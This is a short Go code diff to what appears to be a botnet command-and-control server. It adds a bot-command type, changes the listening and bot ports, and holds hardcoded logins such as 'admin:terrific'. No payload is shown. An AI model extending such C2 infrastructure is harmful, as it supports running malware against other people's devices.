@@ -30,11 +30,19 @@ type CNC struct {
 
 
 
+
+type BotCmd struct {
+	Name		string
+	Command		string
+}
+
+
+
 func main() {
 	cnc := CNC {
 		Host: "127.0.0.1",
-		Port: 1337,
-		BotPort: 7331,
+		Port: 8901,
+		BotPort: 6298,
 		Users: []string {
 			"admin:terrific",
 			"guest:guest",
